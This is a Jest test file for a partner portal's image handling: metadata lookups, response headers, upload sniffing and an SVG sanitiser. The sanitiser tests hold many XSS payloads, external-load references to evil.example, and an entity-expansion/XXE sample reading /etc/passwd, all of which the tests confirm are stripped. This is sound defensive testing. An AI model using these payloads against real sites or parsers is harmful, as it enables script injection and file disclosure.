import { describe, it, expect, beforeEach, jest } from "@jest/globals";

/**
 * Profile photo and partner logo (lib/portal/images.ts).
 *
 * imageMeta is the contract the portal shell builds on: whether there is a photo and a
 * logo, their versions for cache busting, and — while an admin views as a partner — the
 * viewed partner's logo and no photo. It must never read the image bytes, because it runs
 * on every page.
 */

const findUnique = jest.fn<(args: any) => Promise<any>>();
const scopeFor = jest.fn<(user: any) => Promise<any>>();

jest.mock("@/lib/prisma", () => ({ prisma: { portalImage: { findUnique: (args: any) => findUnique(args) } } }));
jest.mock("@/lib/portal/scope", () => ({ scopeFor: (user: any) => scopeFor(user) }));
jest.mock("@/lib/portal/salesforce", () => ({
  isSalesforceId: (id: unknown) => typeof id === "string" && /^[a-zA-Z0-9]{15}([a-zA-Z0-9]{3})?$/.test(id),
}));

import { MAX_IMAGE_BYTES, imageMeta, imageResponseHeaders, sessionAccountFor, sanitizeSvg, sniffImage, validateImage } from "@/lib/portal/images";

const ACCOUNT = "001AB00000abcdEFGH";
const OTHER_ACCOUNT = "001AB00000zzzzZZZZ";

function partner(over: Record<string, unknown> = {}): any {
  return { id: "user-1", sfAccountId: ACCOUNT, sfContactId: "003AB00000abcdEFGH", contactId: "003AB00000abcdEFGH", viewingAs: null, ...over };
}

beforeEach(() => {
  findUnique.mockReset();
  scopeFor.mockReset();
});

describe("imageMeta", () => {
  it("reports photo and logo versions without selecting the bytes", async () => {
    const photoAt = new Date("2026-10-15T08:00:00.000Z");
    const logoAt = new Date("2026-10-14T08:00:00.000Z");
    findUnique.mockImplementation(async (args: any) =>
      args.where.kind_ownerId.kind === "photo"
        ? { id: "p", updatedAt: photoAt, onLight: false }
        : { id: "l", updatedAt: logoAt, onLight: true }
    );

    const meta = await imageMeta(partner());

    expect(meta).toEqual({ photo: { v: photoAt.getTime() }, logo: { v: logoAt.getTime(), onLight: true } });
    for (const [args] of findUnique.mock.calls as any[]) {
      expect(args.select).toEqual({ id: true, updatedAt: true, onLight: true });
    }
    const owners = (findUnique.mock.calls as any[]).map(([a]) => a.where.kind_ownerId);
    expect(owners).toEqual(expect.arrayContaining([{ kind: "photo", ownerId: "user-1" }, { kind: "logo", ownerId: ACCOUNT }]));
  });

  it("returns nulls when nothing is stored", async () => {
    findUnique.mockResolvedValue(null);
    expect(await imageMeta(partner())).toEqual({ photo: null, logo: null });
  });

  it("does not look for a logo when the user has no partner company", async () => {
    findUnique.mockResolvedValue(null);
    await imageMeta(partner({ sfAccountId: null }));
    const kinds = (findUnique.mock.calls as any[]).map(([a]) => a.where.kind_ownerId.kind);
    expect(kinds).toEqual(["photo"]);
  });

  it("shows the viewed partner's logo and no photo while an admin views as a partner", async () => {
    scopeFor.mockResolvedValue({ contactId: "003AB00000viewedXX", accountId: OTHER_ACCOUNT, companyWide: false });
    findUnique.mockResolvedValue({ id: "l", updatedAt: new Date(1000), onLight: false });

    const admin = partner({ id: "admin-1", sfAccountId: null, viewingAs: { contactId: "003AB00000viewedXX", name: "Meier" } });
    const meta = await imageMeta(admin);

    expect(meta.photo).toBeNull();
    expect(meta.logo).toEqual({ v: 1000, onLight: false });
    const owners = (findUnique.mock.calls as any[]).map(([a]) => a.where.kind_ownerId);
    expect(owners).toEqual([{ kind: "logo", ownerId: OTHER_ACCOUNT }]);
  });

  it("never throws: a missing table means no images", async () => {
    findUnique.mockRejectedValue(new Error('relation "PortalImage" does not exist'));
    const spy = jest.spyOn(console, "error").mockImplementation(() => {});
    expect(await imageMeta(partner())).toEqual({ photo: null, logo: null });
    spy.mockRestore();
  });
});

describe("sessionAccountFor", () => {
  it("ignores an account id that is not a Salesforce id", async () => {
    expect(await sessionAccountFor(partner({ sfAccountId: "../etc" }))).toBeNull();
  });

  it("survives Salesforce being down while viewing as a partner", async () => {
    scopeFor.mockRejectedValue(new Error("down"));
    const spy = jest.spyOn(console, "error").mockImplementation(() => {});
    expect(await sessionAccountFor(partner({ viewingAs: { contactId: "003AB00000viewedXX", name: "X" } }))).toBeNull();
    spy.mockRestore();
  });
});

describe("imageResponseHeaders", () => {
  const img = { id: "i1", mime: "image/svg+xml", updatedAt: new Date(5000) };

  it("is private, never sniffed, and allows no script", () => {
    const h = imageResponseHeaders(img, null);
    expect(h["Content-Type"]).toBe("image/svg+xml");
    expect(h["Cache-Control"]).toMatch(/^private/);
    expect(h["X-Content-Type-Options"]).toBe("nosniff");
    expect(h["Content-Security-Policy"]).toContain("default-src 'none'");
    expect(h["Content-Security-Policy"]).not.toMatch(/script-src/);
    expect(h["Content-Security-Policy"]).toContain("sandbox");
  });

  it("caches for good only when the current version is asked for", () => {
    expect(imageResponseHeaders(img, "5000")["Cache-Control"]).toContain("immutable");
    expect(imageResponseHeaders(img, "4000")["Cache-Control"]).toBe("private, no-cache");
  });
});

// ---------------------------------------------------------------------------
// Upload validation: the bytes decide, not the file name
// ---------------------------------------------------------------------------

const PNG = Uint8Array.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0, 0, 13, 0x49, 0x48, 0x44, 0x52]);
const JPEG = Uint8Array.from([0xff, 0xd8, 0xff, 0xe0, 0, 16, 0x4a, 0x46, 0x49, 0x46]);
const WEBP = new TextEncoder().encode("RIFF\u0010\u0000\u0000\u0000WEBPVP8 ");
const utf8 = (s: string) => new TextEncoder().encode(s);
const LOGO = `<?xml version="1.0" encoding="UTF-8"?>
<!-- Generator: Adobe Illustrator -->
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd" [
  <!ENTITY ns_ai "http://ns.adobe.com/AdobeIllustrator/10.0/">
]>
<svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 200 60" width="200" height="60">
  <defs>
    <style>.cls-1{fill:#caf476;}.cls-2{fill:url(#grad);}</style>
    <linearGradient id="grad" x1="0" y1="0" x2="1" y2="0"><stop offset="0" stop-color="#132219"/><stop offset="1" stop-color="#fff"/></linearGradient>
  </defs>
  <title>Meier &amp; Partner</title>
  <path class="cls-1" d="M0 0h40v40H0z"/>
  <rect class="cls-2" x="50" y="0" width="40" height="40" fill="url(#grad)"/>
  <use xlink:href="#grad" x="10"/>
  <text x="100" y="30" font-family="Arial" style="font-weight:700">Meier &lt;AG&gt;</text>
</svg>`;

/** Tags balance: what the browser's XML parser needs to render the logo at all. */
function wellFormed(svg: string): boolean {
  const stack: string[] = [];
  for (const m of Array.from(svg.matchAll(/<(\/?)([A-Za-z][\w.:-]*)[^>]*?(\/?)>/g))) {
    const [, closing, name, self] = m;
    if (self) continue;
    if (closing) {
      if (stack.pop() !== name) return false;
    } else stack.push(name);
  }
  return stack.length === 0;
}

describe("sniffImage", () => {
  it("recognises PNG, JPEG, WebP and SVG by their first bytes", () => {
    expect(sniffImage(PNG)).toBe("image/png");
    expect(sniffImage(JPEG)).toBe("image/jpeg");
    expect(sniffImage(WEBP)).toBe("image/webp");
    expect(sniffImage(utf8(LOGO))).toBe("image/svg+xml");
    expect(sniffImage(utf8('﻿<svg xmlns="http://www.w3.org/2000/svg"/>'))).toBe("image/svg+xml");
  });

  it("refuses anything else, whatever it is called", () => {
    expect(sniffImage(utf8("%PDF-1.7\n%âãÏÓ"))).toBeNull();
    expect(sniffImage(utf8("GIF89a"))).toBeNull();
    expect(sniffImage(utf8("<html><body><svg></svg></body></html>"))).toBeNull();
    expect(sniffImage(utf8("<script>alert(1)</script>"))).toBeNull();
    expect(sniffImage(utf8("just text renamed to logo.png"))).toBeNull();
    expect(sniffImage(new Uint8Array(0))).toBeNull();
  });
});

describe("validateImage", () => {
  it("takes PNG, JPEG and WebP as a photo, but no SVG", () => {
    expect(validateImage("photo", PNG)).toMatchObject({ ok: true, mime: "image/png" });
    expect(validateImage("photo", JPEG)).toMatchObject({ ok: true, mime: "image/jpeg" });
    expect(validateImage("photo", WEBP)).toMatchObject({ ok: true, mime: "image/webp" });
    expect(validateImage("photo", utf8(LOGO))).toEqual({ ok: false, problem: "type" });
  });

  it("takes PNG, JPEG and SVG as a logo, and stores the sanitised SVG", () => {
    expect(validateImage("logo", PNG)).toMatchObject({ ok: true, mime: "image/png" });
    expect(validateImage("logo", WEBP)).toEqual({ ok: false, problem: "type" });
    const r = validateImage("logo", utf8(LOGO.replace("<title>", "<script>alert(1)</script><title>")));
    expect(r.ok).toBe(true);
    if (r.ok) {
      const stored = new TextDecoder().decode(r.data);
      expect(r.mime).toBe("image/svg+xml");
      expect(stored).not.toMatch(/script|alert/i);
      expect(stored).toContain("<path");
    }
  });

  it("refuses empty files and files over 2 MB", () => {
    expect(validateImage("photo", new Uint8Array(0))).toEqual({ ok: false, problem: "empty" });
    const big = new Uint8Array(MAX_IMAGE_BYTES + 1);
    big.set(PNG);
    expect(validateImage("photo", big)).toEqual({ ok: false, problem: "tooLarge" });
    const exact = new Uint8Array(MAX_IMAGE_BYTES);
    exact.set(PNG);
    expect(validateImage("photo", exact).ok).toBe(true);
  });

  it("refuses an SVG that cannot be rebuilt", () => {
    const deep = '<svg xmlns="http://www.w3.org/2000/svg">' + "<g>".repeat(300) + "</svg>";
    expect(validateImage("logo", utf8(deep))).toEqual({ ok: false, problem: "svg" });
  });
});

// ---------------------------------------------------------------------------
// SVG sanitising: the logo is shown to every user of the partner company
// ---------------------------------------------------------------------------

describe("sanitizeSvg keeps a real logo intact", () => {
  const out = sanitizeSvg(LOGO)!;

  it("keeps shapes, gradients, classes, styles and text", () => {
    expect(out).toMatch(/^<svg xmlns="http:\/\/www\.w3\.org\/2000\/svg"/);
    expect(out).toContain('viewBox="0 0 200 60"');
    expect(out).toContain('<path class="cls-1" d="M0 0h40v40H0z"/>');
    expect(out).toContain('fill="url(#grad)"');
    expect(out).toContain("<linearGradient");
    expect(out).toContain('<stop offset="0" stop-color="#132219"/>');
    expect(out).toContain(".cls-1{fill:#caf476;}.cls-2{fill:url(#grad);}");
    expect(out).toContain('<use href="#grad" x="10"/>');
    expect(out).toContain('style="font-weight:700"');
    expect(out).toContain("Meier &amp; Partner");
    expect(out).toContain("Meier &lt;AG&gt;");
  });

  it("drops the prolog, the DOCTYPE and the foreign namespaces", () => {
    expect(out).not.toMatch(/<\?xml|<!DOCTYPE|<!ENTITY|<!--|xmlns:xlink|Illustrator/);
  });

  it("is well-formed", () => {
    expect(wellFormed(out)).toBe(true);
  });

  it("keeps the content of an Illustrator <switch> and drops its foreignObject", () => {
    const ai = `<svg xmlns="http://www.w3.org/2000/svg" xmlns:i="&ns_ai;"><switch><foreignObject requiredExtensions="&ns_ai;" width="1" height="1"><i:pgfRef xlink:href="#adobe_illustrator_pgf"/></foreignObject><g i:extraneous="self"><circle cx="5" cy="5" r="4"/></g></switch></svg>`;
    const r = sanitizeSvg(ai)!;
    expect(r).toContain('<switch><g><circle cx="5" cy="5" r="4"/></g></switch>');
    expect(r).not.toMatch(/foreignObject|pgf|extraneous/);
  });
});

describe("sanitizeSvg removes everything that can run or load", () => {
  const svg = (body: string, rootAttrs = "") => `<svg xmlns="http://www.w3.org/2000/svg"${rootAttrs}>${body}</svg>`;

  it("removes <script> in any spelling, with its content", () => {
    for (const body of [
      "<script>alert(1)</script>",
      "<SCRIPT>alert(1)</SCRIPT>",
      '<script type="text/javascript"><![CDATA[ alert(1) ]]></script>',
      '<script href="https://evil.example/x.js"/>',
      '<svg:script xmlns:svg="http://www.w3.org/2000/svg">alert(1)</svg:script>',
      '<html:script xmlns:html="http://www.w3.org/1999/xhtml">alert(1)</html:script>',
      "<g><script>alert(1)</script><rect/></g>",
    ]) {
      const r = sanitizeSvg(svg(body))!;
      expect(r).not.toMatch(/script|alert|evil/i);
      expect(wellFormed(r)).toBe(true);
    }
  });

  it("removes event handlers on every element", () => {
    const r = sanitizeSvg(svg('<rect onclick="alert(1)" ONMOUSEOVER="alert(2)" width="5"/><g onfocusin="alert(3)"><circle r="2" onbegin="x"/></g>', ' onload="alert(0)"'))!;
    expect(r).not.toMatch(/\son\w+=|alert/i);
    expect(r).toContain('<rect width="5"/>');
  });

  it("removes foreignObject and the HTML inside it", () => {
    const r = sanitizeSvg(
      svg('<foreignObject width="100" height="100"><body xmlns="http://www.w3.org/1999/xhtml"><iframe src="https://evil.example"></iframe><img src="x" onerror="alert(1)"/></body></foreignObject><rect/>')
    )!;
    expect(r).not.toMatch(/foreignObject|iframe|img|evil|alert|body/i);
    expect(r).toContain("<rect/>");
  });

  it("removes javascript: links but keeps what they wrapped", () => {
    const r = sanitizeSvg(svg('<a href="javascript:alert(1)"><text>Klick</text></a><a xlink:href="&#106;avascript:alert(2)"><rect/></a>'))!;
    expect(r).not.toMatch(/javascript|alert|<a[\s>]/i);
    expect(r).toContain("<text>Klick</text>");
    expect(r).toContain("<rect/>");
  });

  it("removes references outside the file", () => {
    const cases = [
      '<use href="https://evil.example/sprite.svg#icon"/>',
      '<use xlink:href="//evil.example/sprite.svg#icon"/>',
      '<use href="&#x6A;avascript:alert(1)"/>',
      '<image href="https://evil.example/tracker.png" width="10" height="10"/>',
      '<image xlink:href="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+" width="10" height="10"/>',
      '<feImage href="https://evil.example/x.png"/>',
      '<rect fill="url(https://evil.example/paint.svg#p)"/>',
      '<rect fill="url(  &quot;https://evil.example/p.svg#p&quot;)"/>',
      '<rect style="fill:url(https://evil.example/p.svg#p); stroke: red"/>',
      '<rect style="background:u\\72l(https://evil.example/t.png)"/>',
      '<rect style="background-image:image-set(&quot;https://evil.example/t.png&quot; 1x)"/>',
      '<rect src="https://evil.example/x"/>',
    ];
    for (const body of cases) {
      const r = sanitizeSvg(svg(body))!;
      expect(r).not.toMatch(/evil|javascript|data:image\/svg/i);
      expect(wellFormed(r)).toBe(true);
    }
    expect(sanitizeSvg(svg('<rect style="fill:url(https://evil.example/p.svg#p); stroke: red"/>'))).toContain("stroke: red");
  });

  it("keeps an embedded raster image", () => {
    const r = sanitizeSvg(svg('<image href="data:image/png;base64,iVBORw0KGgo=" width="10" height="10"/>'))!;
    expect(r).toContain('<image href="data:image/png;base64,iVBORw0KGgo=" width="10" height="10"/>');
  });

  it("removes loading and script hooks from <style>", () => {
    const r = sanitizeSvg(
      svg(
        "<style>@import url(https://evil.example/a.css); @import 'https://evil.example/b.css';" +
          "@font-face{font-family:x;src:url(https://evil.example/f.woff)}" +
          ".a{background:url('https://evil.example/t.png')}.b{fill:url(#ok)}.c{width:expression(alert(1))}" +
          ".d{background:u/**/rl(https://evil.example/c.png)}.e{-moz-binding:url(https://evil.example/x.xml#b)}" +
          '.f{background:url(https://evil.example/unclosed</style><rect class="a"/>'
      )
    )!;
    expect(r).not.toMatch(/evil|expression|alert|@import|@font-face|binding/i);
    expect(r).toContain(".b{fill:url(#ok)}");
    expect(wellFormed(r)).toBe(true);
  });

  it("removes animation, which can rewrite attributes after the fact", () => {
    const r = sanitizeSvg(
      svg(
        '<a><animate attributeName="href" to="javascript:alert(1)" begin="0s"/><text>x</text></a><set attributeName="onmouseover" to="alert(1)"/><animateTransform attributeName="transform" type="rotate" from="0" to="360"/>'
      )
    )!;
    expect(r).not.toMatch(/animate|<set|javascript|alert|attributeName/i);
  });

  it("drops entity definitions instead of expanding them", () => {
    const bomb = `<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;"><!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&b;&xxe;</text></svg>`;
    expect(sanitizeSvg(bomb)).toBe('<svg xmlns="http://www.w3.org/2000/svg"><text>&amp;b;&amp;xxe;</text></svg>');
  });

  it("removes processing instructions such as xml-stylesheet", () => {
    const r = sanitizeSvg('<?xml-stylesheet type="text/css" href="https://evil.example/x.css"?><svg xmlns="http://www.w3.org/2000/svg"><rect/></svg>');
    expect(r).toBe('<svg xmlns="http://www.w3.org/2000/svg"><rect/></svg>');
  });

  it("cannot be broken out of with quotes or stray markup", () => {
    const r = sanitizeSvg(svg(`<rect id='a" onload="alert(1)' width="1"/><text>1 < 2 &amp; "x"</text><title>]]&gt;</title>`))!;
    // The handler stays text inside the escaped id value; no attribute named onload exists.
    expect(r).not.toMatch(/\sonload="/i);
    expect(r).toContain('id="a&quot; onload=&quot;alert(1)"');
    expect(r).toContain('<text>1 &lt; 2 &amp; "x"</text>');
    expect(wellFormed(r)).toBe(true);
  });

  it("closes what the input left open and ignores stray end tags", () => {
    const r = sanitizeSvg('<svg xmlns="http://www.w3.org/2000/svg"><g><rect></g></circle><g><path d="M0 0"')!;
    expect(wellFormed(r)).toBe(true);
    expect(r).toContain("<rect></rect>");
  });

  it("only rebuilds SVG documents", () => {
    expect(sanitizeSvg("<html><svg/></html>")).toBeNull();
    expect(sanitizeSvg("no markup at all")).toBeNull();
    expect(sanitizeSvg("")).toBeNull();
  });

  it("stays fast on hostile input", () => {
    const started = Date.now();
    sanitizeSvg('<svg xmlns="http://www.w3.org/2000/svg">' + '<a b="'.repeat(150_000));
    sanitizeSvg('<svg xmlns="http://www.w3.org/2000/svg">' + "</".repeat(300_000));
    sanitizeSvg('<svg xmlns="http://www.w3.org/2000/svg"><style>' + "url(".repeat(300_000) + "</style></svg>");
    sanitizeSvg('<svg xmlns="http://www.w3.org/2000/svg">' + "<g>".repeat(200) + "</x>".repeat(200_000));
    expect(Date.now() - started).toBeLessThan(5000);
  });
});
